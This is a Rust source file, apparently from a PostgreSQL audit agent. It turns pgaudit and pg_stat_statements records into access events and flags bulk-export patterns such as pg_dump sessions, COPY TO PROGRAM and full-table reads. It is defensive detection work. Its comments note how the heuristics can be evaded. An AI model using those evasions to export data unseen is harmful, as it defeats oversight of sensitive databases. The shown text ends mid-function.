//! From pgaudit records and `pg_stat_statements` deltas to masked access
//! events (ADR-0007): who, which objects (normalized names), which action,
//! how many rows, and the signals computed here from the raw text, which
//! never leaves the agent.
//!
//! Signal heuristics (the vocabulary is `classifiers::masking::Signal`):
//! - `signature.pg_dump`: `application_name` is `pg_dump` / `pg_dumpall`
//!   (spoofable, cheap), or one session (one role within one
//!   `pg_stat_statements` poll) copied at least [`DUMP_MIN_RELATIONS`]
//!   distinct whole relations to the client (`COPY … TO STDOUT`), which is
//!   what `pg_dump` does whatever its `application_name`.
//! - `signature.copy_to_file` / `signature.copy_to_program`: `COPY … TO
//!   '<file>'` / `COPY … TO PROGRAM` (server-side export).
//! - `shape.full_table_copy`: `COPY` out of a whole relation, or of a query
//!   without filter, aggregation or small limit.
//! - `shape.full_table_read`: a read (`SELECT`, `TABLE`) without top-level
//!   `WHERE`, `GROUP BY` / aggregate-only list, derived table, and without
//!   a limit or with a limit above [`LARGE_LIMIT`] rows.
//! - `volume.large_result`: more than [`LARGE_ROWS`] rows returned or
//!   affected (one statement with `pgaudit.log_rows`, or one counter
//!   delta).
//!
//! `shape.*` are heuristics and evadable by design (`WHERE true`,
//! `LIMIT 10000` pages); volume × sensitivity in the console is the robust
//! signal.
//!
//! Each pgaudit record is analyzed on its own statement text, and only the
//! statements matching its command tag count (`select 1; copy … to
//! program …` logs two records). A read or write whose objects cannot be
//! told (function bodies, unparsable text) is reported against `*`, never
//! dropped; statements naming only catalogs (`pg_catalog`,
//! `information_schema`, `pg_toast`, the `pg_stat_statements` relations
//! in the extension's schema, unqualified `pg_*` under the rules of
//! `CatalogRule`) are skipped. Events of the agent's own account
//! are left out only when they come from its `application_name` and client
//! address, carry no signal, and either are one of the connector's own
//! statements that read no relation (exact text: as sent with pgaudit, as
//! `pg_stat_statements` stores it, parameters in place, with
//! `pg_stat_statements`; not charged) or stay within
//! Discovery's row budget per named object and window (`PgOwn`). Any
//! other event of the agent's account on `*` is reported.

use std::collections::{HashMap, HashSet, VecDeque};
use std::time::{Instant, SystemTime};

use databastion_core::audit::own::{ClientSeen, OwnAccount};

use databastion_classifiers::masking::{
    ClientAddr, EventAction, EventObject, EventPrincipal, EventSource, MaskedEvent, Signal,
};
use databastion_classifiers::names::NormalizedName;
use databastion_classifiers::query::{
    AnalyzeOptions, CopyEndpoint, QueryAnalysis, RelationName, StatementInfo, StatementKind,
    analyze,
};

use super::records::AuditRecord;
use crate::discover::normalize;
use crate::sql;

/// A limit above this many rows reads a whole relation.
pub(crate) const LARGE_LIMIT: u64 = 10_000;
/// Rows above which `volume.large_result` is set. Both thresholds sit just
/// above the agent's own maximum sample (`limits.max_sample_rows` is at
/// most 10 000), so its Discovery statements never carry these signals.
pub(crate) const LARGE_ROWS: u64 = 10_000;
/// Whole relations copied to the client by one session before
/// `signature.pg_dump` is set.
pub(crate) const DUMP_MIN_RELATIONS: usize = 3;
/// Sessions followed for the `pg_dump` pattern (oldest forgotten first).
const MAX_SESSIONS: usize = 4096;
/// Relations remembered per session.
const MAX_SESSION_RELATIONS: usize = 64;

fn analyze_opts(truncated: bool) -> AnalyzeOptions {
    let mut o = AnalyzeOptions::new().truncated(truncated);
    o.large_limit = LARGE_LIMIT + 1;
    o
}

/// What tells a catalog apart in one database, from the probe of
/// `check::prerequisites` (the agent's own session).
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub(crate) struct DbCatalog {
    /// Schema of the `pg_stat_statements` extension, when installed.
    pub(crate) pss_schema: Option<String>,
    /// `pgaudit.log_catalog`, when pgaudit is loaded.
    pub(crate) pgaudit_log_catalog: Option<bool>,
}

/// [`DbCatalog`] per database of the target (a database not listed has
/// no extension schema and an unknown `pgaudit.log_catalog`).
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub(crate) struct Catalogs {
    dbs: HashMap<String, DbCatalog>,
}

impl Catalogs {
    pub(crate) fn insert(&mut self, database: &str, c: DbCatalog) {
        self.dbs.insert(database.to_owned(), c);
    }

    fn get(&self, database: &str) -> Option<&DbCatalog> {
        self.dbs.get(database)
    }

    /// The rule for a statement of `database`. `unqualified_pg`: whether an
    /// unqualified `pg_*` name counts as a catalog without confirmation.
    fn rule<'a>(
        &'a self,
        database: &str,
        unqualified_pg: bool,
        confirmed: &'a HashSet<String>,
    ) -> CatalogRule<'a> {
        CatalogRule {
            pss_schema: self.get(database).and_then(|c| c.pss_schema.as_deref()),
            unqualified_pg,
            confirmed,
        }
    }
}

/// The extension's relations (`pg_stat_statements`: statistics, not
/// application data; the agent's own probes read them).
fn is_pss_relation(name: &str) -> bool {
    matches!(name, "pg_stat_statements" | "pg_stat_statements_info")
}

/// Which relations count as catalogs for one statement.
#[derive(Clone, Copy)]
struct CatalogRule<'a> {
    /// Schema of the `pg_stat_statements` extension in the statement's
    /// database: only its two relations there count, not a
    /// `pg_stat_statements*` name elsewhere (any role with `CREATE` can
    /// make one).
    pss_schema: Option<&'a str>,
    /// An unqualified `pg_*` name is a catalog. With pgaudit and
    /// `pgaudit.log_catalog = off`, statements on catalogs only are not
    /// logged, so an unqualified `pg_*` name in a logged statement is a
    /// catalog only when pgaudit names it in `pg_catalog`
    /// (`confirmed`). `pg_stat_statements` sees no object names: a
    /// residual (README).
    unqualified_pg: bool,
    /// Names pgaudit reported in `pg_catalog` within the statement.
    confirmed: &'a HashSet<String>,
}

fn is_catalog(r: &RelationName, rule: CatalogRule<'_>) -> bool {
    match r.schema.as_deref() {
        Some("pg_catalog" | "information_schema" | "pg_toast") => true,
        Some(s) if s.starts_with("pg_temp_") || s.starts_with("pg_toast_temp_") => true,
        Some(s) => rule.pss_schema == Some(s) && is_pss_relation(&r.name),
        None if is_pss_relation(&r.name) => rule.pss_schema.is_some(),
        None => {
            r.name.starts_with("pg_") && (rule.unqualified_pg || rule.confirmed.contains(&r.name))
        }
    }
}

/// Splits a pgaudit object name (`schema.table`, parts possibly quoted).
fn split_object_name(raw: &str) -> Option<RelationName> {
    let mut parts: Vec<String> = Vec::new();
    let mut cur = String::new();
    let mut quoted = false;
    let mut chars = raw.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '"' if quoted && chars.peek() == Some(&'"') => {
                chars.next();
                cur.push('"');
            }
            '"' => quoted = !quoted,
            '.' if !quoted => parts.push(std::mem::take(&mut cur)),
            _ => cur.push(c),
        }
    }
    if quoted {
        return None;
    }
    parts.push(cur);
    if parts.iter().any(String::is_empty) || parts.len() > 3 {
        return None;
    }
    let name = parts.pop()?;
    Some(RelationName {
        schema: parts.pop(),
        name,
    })
}

fn object(database: &str, r: &RelationName) -> EventObject {
    EventObject::new(
        normalize(database),
        r.schema.as_deref().map(normalize),
        normalize(&r.name),
    )
}

/// An object the source does not name: the database, and `*`.
fn unknown_object(database: &str) -> EventObject {
    EventObject::new(normalize(database), None, NormalizedName::wildcard())
}

/// pgaudit object types that hold rows.
fn is_relation_type(t: &str) -> bool {
    matches!(
        t,
        "TABLE" | "VIEW" | "MATERIALIZED VIEW" | "FOREIGN TABLE" | "PARTITIONED TABLE"
    )
}

fn is_dump_application(app: &str) -> bool {
    matches!(app.trim(), "pg_dump" | "pg_dumpall")
}

/// Statement kinds a pgaudit command tag can stand for.
fn kinds_of(command: &str) -> &'static [StatementKind] {
    match command {
        "SELECT" => &[
            StatementKind::Select,
            StatementKind::Table,
            StatementKind::Values,
        ],
        "COPY" => &[StatementKind::Copy],
        "INSERT" => &[StatementKind::Insert],
        "UPDATE" => &[StatementKind::Update],
        "DELETE" => &[StatementKind::Delete],
        "MERGE" => &[StatementKind::Merge],
        _ => &[],
    }
}

/// The statements of `a` a record with `command` is about: those of the
/// matching kind (a `DO` body included); every statement when none
/// matches (the text does not settle it).
fn matching<'a>(a: &'a QueryAnalysis, command: Option<&str>) -> Vec<&'a StatementInfo> {
    let kinds = command.map_or(&[][..], kinds_of);
    let m: Vec<&StatementInfo> = a
        .parts()
        .iter()
        .filter(|p| kinds.contains(&p.kind))
        .collect();
    if m.is_empty() {
        a.parts().iter().collect()
    } else {
        m
    }
}

/// Relations named by `parts`, catalogs excluded; the flag says whether
/// any relation (catalogs included) was named.
fn user_relations(parts: &[&StatementInfo], rule: CatalogRule<'_>) -> (Vec<RelationName>, bool) {
    let mut out = Vec::new();
    let mut any = false;
    for p in parts {
        for r in &p.relations {
            any = true;
            if !is_catalog(r, rule) && !out.contains(r) {
                out.push(r.clone());
            }
        }
    }
    (out, any)
}

/// Signals of statements from their analysis (not the session pattern).
fn statement_signals(
    parts: &[&StatementInfo],
    rows: Option<u64>,
    rule: CatalogRule<'_>,
) -> Vec<Signal> {
    let mut out = Vec::new();
    for p in parts {
        if let Some(c) = p.copy
            && c.to
        {
            match c.endpoint {
                CopyEndpoint::File => out.push(Signal::CopyToFile),
                CopyEndpoint::Program => out.push(Signal::CopyToProgram),
                CopyEndpoint::Client | CopyEndpoint::Unknown => {}
            }
            if c.whole_relation {
                out.push(Signal::FullTableCopy);
            }
        }
        if p.kind.is_read()
            && p.relations.iter().any(|r| !is_catalog(r, rule))
            && p.shape.is_some_and(|s| s.whole_relation(LARGE_LIMIT + 1))
        {
            out.push(Signal::FullTableRead);
        }
    }
    if rows.is_some_and(|r| r > LARGE_ROWS) {
        out.push(Signal::LargeResult);
    }
    out
}

/// Relations a statement copies whole to the client.
fn copied_to_client(parts: &[&StatementInfo], rule: CatalogRule<'_>) -> Vec<RelationName> {
    let mut out = Vec::new();
    for p in parts {
        if p.copy
            .is_some_and(|c| c.to && c.whole_relation && c.endpoint == CopyEndpoint::Client)
        {
            out.extend(p.relations.iter().filter(|r| !is_catalog(r, rule)).cloned());
        }
    }
    out
}

/// Sessions seen copying whole relations to the client.
#[derive(Default)]
pub(crate) struct DumpTracker {
    sessions: HashMap<String, HashSet<RelationName>>,
    order: VecDeque<String>,
}

impl DumpTracker {
    /// Records the relations a statement of `session` copied whole to the
    /// client; `true` once the session reached [`DUMP_MIN_RELATIONS`].
    pub(crate) fn copied(&mut self, session: &str, relations: &[RelationName]) -> bool {
        if !self.sessions.contains_key(session) {
            if self.sessions.len() >= MAX_SESSIONS
                && let Some(old) = self.order.pop_front()
            {
                self.sessions.remove(&old);
            }
            self.order.push_back(session.to_owned());
            self.sessions.insert(session.to_owned(), HashSet::new());
        }
        let Some(set) = self.sessions.get_mut(session) else {
            return false;
        };
        for r in relations {
            if set.len() < MAX_SESSION_RELATIONS {
                set.insert(r.clone());
            }
        }
        set.len() >= DUMP_MIN_RELATIONS
    }
}

/// Most statements registered at run time ([`PgOwn::allow_statement`]).
const OWN_MAX_EXTRA_STATEMENTS: usize = 8;

/// Table-less statements registered at run time for a target (the
/// `pg_stat_statements` text query, whose schema is only known then). Kept
/// per target by the connector (`CheckState`), like the row budget, so
/// that a pgaudit stream started after a `pg_stat_statements` period
/// recognizes them in the records of that period. Not persisted.
pub(crate) type SharedOwnStatements = std::sync::Arc<std::sync::Mutex<Vec<String>>>;

/// What an event of the agent's account is about, for [`PgOwn`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum OwnKind {
    /// One of the connector's own statements that read no relation.
    Tableless,
    /// A read or write whose objects the source does not tell (`*`).
    Unknown,
    /// Named relations.
    Named,
}

/// The text `pg_stat_statements` stores for one of the connector's own
/// statements: every constant (string, integer, `true` / `false`)
/// replaced by `$n`, numbered in order of appearance after the highest
/// bound parameter of the statement, everything else verbatim (as
/// PostgreSQL's `generate_normalized_query` does; checked on PostgreSQL
/// 16). The connector's bound parameters stay `$1`, `$2`… in place: a
/// client sending the same statement with constants instead of parameters
/// gets another `queryid` and another text, and is reported (#76 review
/// I2).
///
/// The text alone does not prove the statement is the connector's: a
/// client can prepare this exact text with every constant bound as a
/// parameter, which gets another `queryid` and the same stored text. The
/// `pg_stat_statements` poller therefore also pins, per own statement, the
/// entry's `queryid` first seen with that text, only in the slots the
/// connector itself uses (the agent's role, top level, a database where
/// it runs that statement), and treats anything else with the same text
/// as not the connector's (`audit::pss`, PR #90 review Low-1).
///
/// Only for the connector's own texts (a closed list): `None` on anything
/// they never hold (a comment, an escape, bit or dollar-quoted string, a
/// non-integer number), so such a text never matches.
fn pss_form(text: &str) -> Option<String> {
    let b = text.as_bytes();
    let ident = |c: u8| c.is_ascii_alphanumeric() || c == b'_' || c == b'$';
    // Highest bound parameter.
    let mut highest = 0u32;
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'$' && b.get(i + 1).is_some_and(u8::is_ascii_digit) {
            let from = i + 1;
            i = from;
            while i < b.len() && b[i].is_ascii_digit() {
                i += 1;
            }
            highest = highest.max(text[from..i].parse().ok()?);
        } else {
            i += 1;
        }
    }
    let mut next = highest;
    let mut constant = |out: &mut String| {
        next += 1;
        out.push('$');
        out.push_str(&next.to_string());
    };
    let mut out = String::with_capacity(text.len());
    let mut i = 0;
    while i < b.len() {
        let c = b[i];
        match c {
            b'\'' => {
                // `''` inside a string is a quote.
                let mut j = i + 1;
                loop {
                    match b.get(j) {
                        None => return None,
                        Some(b'\'') if b.get(j + 1) == Some(&b'\'') => j += 2,
                        Some(b'\'') => break,
                        Some(_) => j += 1,
                    }
                }
                constant(&mut out);
                i = j + 1;
            }
            b'"' => {
                let mut j = i + 1;
                loop {
                    match b.get(j) {
                        None => return None,
                        Some(b'"') if b.get(j + 1) == Some(&b'"') => j += 2,
                        Some(b'"') => break,
                        Some(_) => j += 1,
                    }
                }
                out.push_str(&text[i..=j]);
                i = j + 1;
            }
            b'$' if b.get(i + 1).is_some_and(u8::is_ascii_digit) => {
                let mut j = i + 1;
                while j < b.len() && b[j].is_ascii_digit() {
                    j += 1;
                }
                out.push_str(&text[i..j]);
                i = j;
            }
            b'$' => return None,
            b'0'..=b'9' => {
                let mut j = i;
                while j < b.len() && b[j].is_ascii_digit() {
                    j += 1;
                }
                if b.get(j).is_some_and(|&d| ident(d) || d == b'.') {
                    return None;
                }
                constant(&mut out);
                i = j;
            }
            _ if c.is_ascii_alphabetic() || c == b'_' => {
                let mut j = i;
                while j < b.len() && ident(b[j]) {
                    j += 1;
                }
                let word = &text[i..j];
                if b.get(j) == Some(&b'\'') {
                    // `E'…'`, `B'…'`, `U&'…'`: never in the connector's texts.
                    return None;
                }
                if word.eq_ignore_ascii_case("true") || word.eq_ignore_ascii_case("false") {
                    constant(&mut out);
                } else {
                    out.push_str(word);
                }
                i = j;
            }
            b'-' if b.get(i + 1) == Some(&b'-') => return None,
            b'/' if b.get(i + 1) == Some(&b'*') => return None,
            _ if c.is_ascii() => {
                out.push(char::from(c));
                i += 1;
            }
            _ => return None,
        }
    }
    Some(out)
}

/// The agent's own activity in the PostgreSQL sources: the core rule
/// (`databastion_core::audit::own`: account, application, address, no
/// signal, row budget per object) plus what is PostgreSQL-specific.
///
/// - The connector's own statements that name no relation (closed list:
///   [`sql::OWN_TABLELESS`], and the `pg_stat_statements` text query
///   registered by its stream) are left out on the core's identity and
///   signal rules without being charged ([`OwnKind::Tableless`]): they read
///   no row, and charging them used up the `*` budget within one scan.
///   They are recognized by their exact text: as sent with pgaudit (it
///   logs the text verbatim), and as `pg_stat_statements` stores it
///   ([`pss_form`]: constants as `$n`, the connector's bound parameters
///   in place) with `pg_stat_statements`.
/// - Any other event of the agent's account on the unknown object `*`
///   ([`OwnKind::Unknown`]: a function call, even in `pg_catalog`, e.g.
///   `query_to_xml`; a text that does not parse) is reported and never
///   budgeted: the connector names every relation it reads.
pub(crate) struct PgOwn {
    core: OwnAccount,
    own_texts: Vec<String>,
    /// (`pg_stat_statements` form, statement as sent).
    own_pss: Vec<(String, String)>,
    registry: SharedOwnStatements,
}

impl PgOwn {
    pub(crate) fn new(core: OwnAccount, registry: SharedOwnStatements) -> Self {
        let extra = registry
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .clone();
        let mut own = Self {
            core,
            own_texts: Vec::new(),
            own_pss: Vec::new(),
            registry,
        };
        for text in sql::OWN_TABLELESS {
            own.add_statement(text);
        }
        for text in &extra {
            own.add_statement(text);
        }
        own
    }

    fn add_statement(&mut self, text: &str) {
        if self.own_texts.iter().any(|t| t == text) {
            return;
        }
        self.own_texts.push(text.to_owned());
        if let Some(f) = pss_form(text) {
            self.own_pss.push((f, text.to_owned()));
        }
    }

    /// Adds a statement the connector sends that names no relation, and
    /// keeps it for the target's later streams (at most
    /// [`OWN_MAX_EXTRA_STATEMENTS`]; beyond, this stream only).
    pub(crate) fn allow_statement(&mut self, text: &str) {
        self.add_statement(text);
        let mut guard = self
            .registry
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        if !guard.iter().any(|t| t == text) && guard.len() < OWN_MAX_EXTRA_STATEMENTS {
            guard.push(text.to_owned());
        }
    }

    /// `text` is exactly one of the connector's own table-less statements.
    fn own_text(&self, text: &str) -> bool {
        self.own_texts.iter().any(|t| t == text)
    }

    /// Which of the connector's own table-less statements (as sent) `text`,
    /// read from `pg_stat_statements` (not cut), is exactly, as
    /// `pg_stat_statements` stores it ([`pss_form`]). The text is
    /// necessary, not sufficient: the poller also requires the agent's
    /// role, a top-level entry, a database where the connector runs that
    /// statement, and pins the entry's `queryid` (`audit::pss`).
    pub(crate) fn own_pss_form(&self, text: &str) -> Option<&str> {
        self.own_pss
            .iter()
            .find(|(f, _)| f == text)
            .map(|(_, sent)| sent.as_str())
    }

    /// [`Self::own_pss_form`] as a test.
    #[cfg(test)]
    pub(crate) fn own_pss_text(&self, text: &str) -> bool {
        self.own_pss_form(text).is_some()
    }

    /// Whether an event may be left out (see the type documentation).
    fn routine(
        &mut self,
        user: &str,
        application: Option<&str>,
        client: ClientSeen,
        e: &MaskedEvent,
        kind: OwnKind,
        now: Instant,
    ) -> bool {
        match kind {
            OwnKind::Tableless => self.core.routine_unbudgeted(user, application, client, e),
            OwnKind::Unknown => false,
            OwnKind::Named => self.core.routine(user, application, client, e, now),
        }
    }
}
/// Builds events from pgaudit records.
pub(crate) struct PgauditEvents {
    own: PgOwn,
    dumps: DumpTracker,
    catalogs: Catalogs,
    /// Records dropped because their conversion panicked.
    pub(crate) panicked: u64,
}

/// Statement text of a pgaudit record after the first one of its
/// statement and substatement, with `pgaudit.log_statement_once = on`.
const PREVIOUSLY_LOGGED: &str = "<previously logged>";

/// Per class of a statement: objects, rows, signals, unknown objects.
#[derive(Default)]
struct ClassPart {
    objects: Vec<RelationName>,
    rows: Option<u64>,
    signals: Vec<Signal>,
    unknown: bool,
    catalog_only: bool,
    dump: bool,
    /// A record of this class has a text other than one of the
    /// connector's own table-less statements.
    not_own_text: bool,
}

impl PgauditEvents {
    pub(crate) fn new(own: PgOwn) -> Self {
        Self {
            own,
            dumps: DumpTracker::default(),
            catalogs: Catalogs::default(),
            panicked: 0,
        }
    }

    /// [`Self::flush`] of one statement in isolation: a statement whose
    /// conversion panics is dropped alone, its records counted in
    /// `panicked` (PR #83 re-review M-A).
    fn flush_isolated(
        &mut self,
        group: Vec<AuditRecord>,
        now: SystemTime,
        out: &mut Vec<MaskedEvent>,
    ) {
        let n = group.len() as u64;
        match databastion_core::isolate(|| {
            let mut events = Vec::new();
            self.flush(group, now, &mut events);
            events
        }) {
            Some(events) => out.extend(events),
            None => self.panicked = self.panicked.saturating_add(n),
        }
    }

    /// Sets the per-database catalog facts (re-probed with the source).
    pub(crate) fn set_catalogs(&mut self, catalogs: Catalogs) {
        self.catalogs = catalogs;
    }

    /// Converts records (in log order) to events: one statement (same
    /// session and statement id, `SESSION` and `OBJECT` records merged)
    /// gives one event per action class (`read`, `write`, `ddl`, `dcl`).
    pub(crate) fn convert(
        &mut self,
        records: Vec<AuditRecord>,
        now: SystemTime,
    ) -> Vec<MaskedEvent> {
        let mut out = Vec::new();
        let mut group: Vec<AuditRecord> = Vec::new();
        for r in records {
            let same = group.first().is_some_and(|g| {
                g.session == r.session && g.audit.statement_id == r.audit.statement_id
            });
            if !same && !group.is_empty() {
                self.flush_isolated(std::mem::take(&mut group), now, &mut out);
            }
            group.push(r);
        }
        if !group.is_empty() {
            self.flush_isolated(group, now, &mut out);
        }
        out
    }

    fn flush(&mut self, group: Vec<AuditRecord>, now: SystemTime, out: &mut Vec<MaskedEvent>) {
        let Some(first) = group.first() else {
            return;
        };
        let mut parts: HashMap<EventAction, ClassPart> = HashMap::new();
        let mut seen_subs: HashSet<(u64, String, String)> = HashSet::new();
        // Names pgaudit reports in `pg_catalog` for this statement, and
        // the first text of each substatement (`log_statement_once`: later
        // records carry `<previously logged>`).
        let mut confirmed: HashSet<String> = HashSet::new();
        let mut first_texts: HashMap<u64, &str> = HashMap::new();
        for r in &group {
            if let Some(rel) = split_object_name(&r.audit.object_name)
                && rel.schema.as_deref() == Some("pg_catalog")
            {
                confirmed.insert(rel.name);
            }
            let text: &str = &r.audit.statement;
            if text != PREVIOUSLY_LOGGED {
                first_texts.entry(r.audit.substatement_id).or_insert(text);
            }
        }
        let log_catalog = self
            .catalogs
            .get(&first.database)
            .and_then(|c| c.pgaudit_log_catalog);
        let rule = self
            .catalogs
            .rule(&first.database, log_catalog != Some(false), &confirmed);
        // Each record is analyzed on its own text (a substatement of a
        // function or DO block logs its own text); consecutive records
        // with the same text reuse the analysis.
        let mut cached: Option<(&str, QueryAnalysis)> = None;
        for r in &group {
            let action = match r.audit.class.as_str() {
                "READ" => EventAction::Read,
                "WRITE" => EventAction::Write,
                "DDL" => EventAction::Ddl,
                "ROLE" => EventAction::Dcl,
                _ => continue,
            };
            // SESSION and OBJECT records of the same substatement and
            // object are one access.
            if !seen_subs.insert((
                r.audit.substatement_id,
                r.audit.object_name.to_string(),
                r.audit.class.clone(),
            )) {
                continue;
            }
            let mut text: &str = &r.audit.statement;
            if text == PREVIOUSLY_LOGGED {
                // Without a first record (not in this read), the text
                // stays unparsable: the objects are unknown (`*`).
                text = first_texts
                    .get(&r.audit.substatement_id)
                    .copied()
                    .unwrap_or(PREVIOUSLY_LOGGED);
            }
            if cached.as_ref().is_none_or(|(t, _)| *t != text) {
                cached = Some((text, analyze(text, analyze_opts(false))));
            }
            let Some((_, analysis)) = cached.as_ref() else {
                continue;
            };
            let stmts = matching(analysis, Some(r.audit.command.as_str()));
            let (text_relations, named_any) = user_relations(&stmts, rule);
            let own_text = self.own.own_text(text);
            let part = parts.entry(action).or_default();
            part.not_own_text |= !own_text;
            let mut named = false;
            if !r.audit.object_name.is_empty()
                && is_relation_type(&r.audit.object_type)
                && let Some(rel) = split_object_name(&r.audit.object_name)
            {
                named = true;
                if is_catalog(&rel, rule) {
                    // A named catalog relation (`pgaudit.log_catalog`,
                    // `pg_stat_statements_info`): not application
                    // data, and not an unknown object either.
                    part.catalog_only = true;
                } else if !part.objects.contains(&rel) {
                    part.objects.push(rel);
                }
            }
            if !named {
                if text_relations.is_empty() {
                    if named_any {
                        part.catalog_only = true;
                    } else {
                        part.unknown = true;
                    }
                }
                for rel in text_relations {
                    if !part.objects.contains(&rel) {
                        part.objects.push(rel);
                    }
                }
            }
            // A utility COPY record logs 0 rows: unknown.
            let utility_copy = r.audit.command == "COPY" && r.audit.object_name.is_empty();
            if let (Some(rows), false) = (r.audit.rows, utility_copy) {
                part.rows = Some(part.rows.map_or(rows, |p| p.max(rows)));
            }
            if action == EventAction::Read {
                part.signals.extend(statement_signals(&stmts, None, rule));
                // PL/pgSQL cannot COPY to the client: a COPY record whose
                // text does not show the COPY (dynamic SQL, nested DO) is
                // a server-side export.
                if r.audit.command == "COPY"
                    && analysis.kind() != StatementKind::Copy
                    && !stmts.iter().any(|p| p.kind == StatementKind::Copy)
                {
                    part.signals.push(Signal::CopyToFile);
                }
                let copied = copied_to_client(&stmts, rule);
                if !copied.is_empty() && self.dumps.copied(&r.session, &copied) {
                    part.dump = true;
                }
            }
        }
        if parts.is_empty() {
            return;
        }
        let principal = EventPrincipal::account(&first.user)
            .with_client(first.remote.as_deref().and_then(ClientAddr::parse))
            .with_application(&first.application);
        let ts = first.ts.unwrap_or(now);
        let mut actions: Vec<EventAction> = parts.keys().copied().collect();
        actions.sort();
        for action in actions {
            let Some(part) = parts.remove(&action) else {
                continue;
            };
            let rw = matches!(action, EventAction::Read | EventAction::Write);
            if rw && part.objects.is_empty() && part.catalog_only && !part.unknown {
                // Only catalogs: not application data.
                continue;
            }
            let mut e = MaskedEvent::new(EventSource::Pgaudit, action, principal.clone(), ts)
                .with_rows(part.rows);
            for o in part.objects.iter().take(16) {
                e = e.with_object(object(&first.database, o));
            }
            let unknown = rw && (part.objects.is_empty() || part.unknown);
            if unknown {
                // A read or write whose objects the log does not tell (a
                // function or procedure body, a statement that does not
                // parse): reported against `*` rather than dropped (the
                // contract needs one object for read / write).
                e = e.with_object(unknown_object(&first.database));
            }
            for s in part.signals {
                e = e.with_signal(s);
            }
            if part.rows.is_some_and(|r| r > LARGE_ROWS) {
                e = e.with_signal(Signal::LargeResult);
            }
            if action == EventAction::Read
                && (part.dump
                    || (is_dump_application(&first.application)
                        && (e.signals().contains(&Signal::FullTableCopy)
                            || e.signals().contains(&Signal::FullTableRead))))
            {
                e = e.with_signal(Signal::PgDump);
            }
            let client = first.remote.as_deref().and_then(ClientAddr::parse);
            let kind = if !part.not_own_text && part.objects.is_empty() {
                OwnKind::Tableless
            } else if unknown {
                OwnKind::Unknown
            } else {
                OwnKind::Named
            };
            if self.own.routine(
                &first.user,
                Some(&first.application),
                ClientSeen::Logged(client),
                &e,
                kind,
                Instant::now(),
            ) {
                continue;
            }
            out.push(e);
        }
    }
}

/// One `pg_stat_statements` counter delta.
pub(crate) struct StatementDelta<'a> {
    pub(crate) user: &'a str,
    pub(crate) database: &'a str,
    pub(crate) analysis: &'a QueryAnalysis,
    /// The text is exactly one of the connector's own table-less
    /// statements ([`PgOwn::own_pss_text`]).
    pub(crate) own_text: bool,
    pub(crate) calls: u64,
    pub(crate) rows: u64,
}

/// Events from the `pg_stat_statements` deltas of one poll, between
/// `from` and `to`. `pg_stat_statements` gives no client address, no
/// application, no per-execution time and no per-execution row count: an
/// event is the sum over the poll interval of one statement for one role.
/// The agent's own account is reported only for deltas carrying a signal
/// (the application name is not visible here).
#[cfg(test)]
pub(crate) fn pss_events(
    deltas: &[StatementDelta<'_>],
    own: &mut PgOwn,
    catalogs: &Catalogs,
    from: SystemTime,
    to: SystemTime,
) -> Vec<MaskedEvent> {
    pss_events_counted(deltas, own, catalogs, from, to).0
}

/// [`pss_events`], with the indices (in `deltas`) of the statements whose
/// conversion panicked, so the caller marks them poisoned and does not
/// convert them again: each statement is converted in isolation
/// (`databastion_core::isolate`), so one that makes the analysis code
/// panic does not stop the others (security review of #85). Its delta is
/// still reported, against `*` ([`pss_unanalyzed_event`]), so a statement
/// shape that makes the code panic cannot hide its executions.
pub(crate) fn pss_events_counted(
    deltas: &[StatementDelta<'_>],
    own: &mut PgOwn,
    catalogs: &Catalogs,
    from: SystemTime,
    to: SystemTime,
) -> (Vec<MaskedEvent>, Vec<usize>) {
    // The pg_dump pattern per role within the poll.
    // No object names here: unqualified `pg_*` names stay catalogs.
    let none = HashSet::new();
    let mut panicked = Vec::new();
    let mut copied: HashMap<&str, HashSet<RelationName>> = HashMap::new();
    for d in deltas {
        let rule = catalogs.rule(d.database, true, &none);
        let all: Vec<&StatementInfo> = d.analysis.parts().iter().collect();
        // A panic here is counted when the same statement is converted
        // below (it panics there too, or is converted without this part).
        if let Some(c) = databastion_core::isolate(|| copied_to_client(&all, rule))
            && !c.is_empty()
        {
            copied.entry(d.user).or_default().extend(c);
        }
    }
    let mut out = Vec::new();
    for (i, d) in deltas.iter().enumerate() {
        match databastion_core::isolate(|| pss_event(d, own, catalogs, &copied, from, to)) {
            Some(Some(e)) => out.push(e),
            Some(None) => {}
            None => {
                panicked.push(i);
                out.push(pss_unanalyzed_event(
                    d.user, d.database, d.calls, d.rows, from, to,
                ));
            }
        }
    }
    (out, panicked)
}

/// The event of a `pg_stat_statements` delta whose statement could not be
/// analyzed or converted (the analysis or conversion panicked; phase-7
/// security review): a read of unknown objects (`*`) with the delta's
/// counts, and `volume.large_result` above [`LARGE_ROWS`] rows. Built
/// from the counters, the role and the database only: no statement text.
/// Never left out as the agent's own activity (the connector names every
/// relation it reads) and never budgeted.
///
/// Always a read, on purpose: the statement's kind is unknown, and a read
/// of `*` over-reports (a write or DDL shows up as a read of unknown
/// objects) rather than hides; it fails safe (PR #90 review Low-2).
pub(crate) fn pss_unanalyzed_event(
    user: &str,
    database: &str,
    calls: u64,
    rows: u64,
    from: SystemTime,
    to: SystemTime,
) -> MaskedEvent {
    let mut e = MaskedEvent::new(
        EventSource::PgStatStatements,
        EventAction::Read,
        EventPrincipal::account(user),
        from,
    )
    .with_rows(Some(rows))
    .with_aggregate(calls, to)
    .with_object(unknown_object(database));
    if rows > LARGE_ROWS {
        e = e.with_signal(Signal::LargeResult);
    }
    e
}

/// [`pss_form`] for the poller's tests.
#[cfg(test)]
pub(crate) fn tests_pss_form(text: &str) -> String {
    pss_form(text).unwrap_or_default()
}

/// Tests: a statement of this role makes its conversion panic (a bug on
/// one statement).
#[cfg(test)]
pub(crate) const TEST_POISON_USER: &str = "test-conversion-panic";

/// One statement's event (see [`pss_events`]); `None` when it gives none.
fn pss_event(
    d: &StatementDelta<'_>,
    own: &mut PgOwn,
    catalogs: &Catalogs,
    copied: &HashMap<&str, HashSet<RelationName>>,
    from: SystemTime,
    to: SystemTime,
) -> Option<MaskedEvent> {
    #[cfg(test)]
    #[allow(clippy::panic)]
    if d.user == TEST_POISON_USER {
        panic!("conversion bug on a statement");
    }
    let none = HashSet::new();
    let rule = catalogs.rule(d.database, true, &none);
    let a = d.analysis;
    let all: Vec<&StatementInfo> = a.parts().iter().collect();
    let action = match a.kind() {
